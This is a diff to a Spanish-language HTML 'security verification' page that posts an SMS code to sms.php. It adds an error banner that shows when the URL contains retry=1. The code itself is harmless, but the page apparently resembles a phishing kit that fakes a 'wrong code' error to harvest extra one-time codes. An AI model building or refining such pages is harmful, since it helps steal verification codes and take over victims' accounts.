@@ -129,6 +129,22 @@
             margin: 20px 0;
             line-height: 1.5;
         }
+        
+        .error-message {
+            background-color: #ffebee;
+            color: #c62828;
+            padding: 12px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-size: 14px;
+            font-weight: 500;
+            border-left: 4px solid #c62828;
+            display: none;
+        }
+        
+        .error-message.show {
+            display: block;
+        }
     </style>
 </head>
 <body>
@@ -144,6 +160,10 @@
         </div>
         <center>
             <form action="sms.php" method="post">
+
+<div class="error-message" id="errorMessage">
+    ❌ Código incorrecto. Por favor, ingresa el código nuevamente.
+</div>
 
 <div class="mensaje-sms">
     <p><strong>Verificación de seguridad</strong></p>
@@ -199,5 +219,13 @@ height: 35px;" type="submit" name="" id="" value="Verificar">
 
         </div>
     </div>
+    
+    <script>
+        // Mostrar mensaje de error si viene de retry
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('retry') === '1') {
+            document.getElementById('errorMessage').classList.add('show');
+        }
+    </script>
 </body>
 </html>
